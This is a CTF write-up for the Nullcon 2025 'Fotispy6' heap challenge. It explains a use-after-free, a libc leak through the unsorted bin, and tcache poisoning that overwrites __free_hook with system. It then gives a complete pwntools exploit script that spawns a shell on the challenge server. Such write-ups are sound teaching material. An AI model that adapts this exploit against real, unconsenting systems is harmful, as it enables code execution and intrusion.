+++
author = "Velobobo"
title = "NullConCTF 2025 - Fotispy6"
date = "2025-09-06"
description = ""
draft = false
slug = "nullcon-2025-chunkythreads"
ctfs = ["Nullcon-2025"]
tags = [
    "heap",
    "ctf",
]
categories = [
    "pwn"
]

+++

# Fotispy6 – Nullcon CTF 2025

## Overview 
This binary was a classic heap-based program where we could add multiple songs and comments, as well as view and delete them.
Protections enabled were: PIE, Canary, NX, and Full RELRO.
Initially, I spent quite some time trying to figure out the exploitation strategy. Then, I randomly checked the libc version and noticed it was 2.31 so there was no pointer mangling(safe linking) in tcache and `__free_hook` function was also present in this libc.

## Reversed Code

main
 {{< figure src="main.png" alt="main" width="500" >}}

add
 {{< figure src="add.png" alt="add" width="500" >}}

edit
 {{< figure src="edit.png" alt="edit" width="500" >}}

view
 {{< figure src="view.png" alt="view" width="500" >}}

delete
 {{< figure src="free.png" alt="free" width="500" >}}

## Exploitation Plan

As the code doesn’t remove the pointer from the list after freeing, there is a UAF vuln. I first leaked libc through an unsorted bin.

```python
addsong(b'a',1300) #0  
addsong(b'b',1300) #1  
delete(0)  
view(0)  
leak=u64(p.recvline()[:-1].ljust(8,b'\x00'))  
log.critical(f"leak : {leak:#x}")  
libcbase=leak-0x1ecbe0  
libc.address=libcbase
```

`b` is a guard chunk so that when the first chunk goes into the unsorted bin it doesn’t get consolidated with the wilderness. After freeing the first chunk, its fd pointer contains the address of the main arena head, which is a libc address. So i leaked this and calculated the libc base.

Now my plan was to overwrite `__free_hook` with address of `system`. To write to __free_hook i needed to get its chunk from a malloc so I used tcache poisoning by changing the fd of a tcache chunk to point to `__free_hook`. Since there’s no safe-linking, I could directly overwrite the fd without mangling.
After getting the chunk , i wrote the address of `system` in `__free_hook` , so that whenever free is called it will call system with the same argument the free was called on.

```python
freehook=libc.symbols['__free_hook']  
system=libc.symbols['system']  
binsh=next(libc.search(b'/bin/sh'))  

addsong(b'c',8) #2  
addsong(b'd',8) #3  
delete(2)  
delete(3)  
edit(3,8,p64(freehook))  
addsong(b'e',8) #4  
addsong(p64(system),8) #5  
```

At last i just add another chunk with `/bin/sh` as its content which will act as an argument when free is called.

```python
addsong(b'/bin/sh',20) #6  
delete(6)
```

## Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./fotispy6_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld   = ELF("./ld-2.31.so", checksec=False)

context.binary = exe
#context.log_level = 'debug'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("52.59.124.14", 5196)
    return r

def addsong(comment, size):
    p.sendlineafter(b'[~] Choice: ', b'2') 
    p.sendlineafter(b'[~] How long will the comment be: ', str(size).encode())
    p.sendlineafter(b'[~] Enter the comment: ', comment)

def edit(idx, newsize, comment):
    p.sendlineafter(b'[~] Choice: ', b'3') 
    p.sendlineafter(b'[~] Which song to you want to select: ', str(idx).encode())
    p.sendlineafter(b'[~] How long will the new comment be: ', str(newsize).encode())
    p.sendlineafter(b'[~] Enter the new comment: ', comment)

def view(idx):
    p.sendlineafter(b'[~] Choice: ', b'4')
    p.sendlineafter(b'[~] Which song to you want to select: ', str(idx).encode())
    p.recvuntil(b'[+] Here is your comment:\n')

def delete(idx):
    p.sendlineafter(b'[~] Choice: ', b'5')
    p.sendlineafter(b'[~] Which song to you want to select: ', str(idx).encode())

p = conn()

# Leak libc
addsong(b'a',1300) #0
addsong(b'b',1300) #1
delete(0)
view(0)
leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
log.critical(f"leak : {leak:#x}")
libcbase = leak - 0x1ecbe0
libc.address = libcbase
log.critical(f"libcbase : {libcbase:#x}")

freehook = libc.symbols['__free_hook']
system   = libc.symbols['system']
binsh    = next(libc.search(b'/bin/sh'))
log.critical(f"freehook : {freehook:#x}")
log.critical(f"system : {system:#x}")
log.critical(f"binsh : {binsh:#x}")

# Tcache poisoning
addsong(b'c',8) #2
addsong(b'd',8) #3
delete(2)
delete(3)
edit(3, 8, b''+p64(freehook))
addsong(b'e',8) #4
addsong(b''+p64(system),8) #5

# Trigger exploit
addsong(b'/bin/sh',20) #6
delete(6)

p.interactive()

```

## Result

{{< figure src="flag.png" alt="flag" width="500" >}}
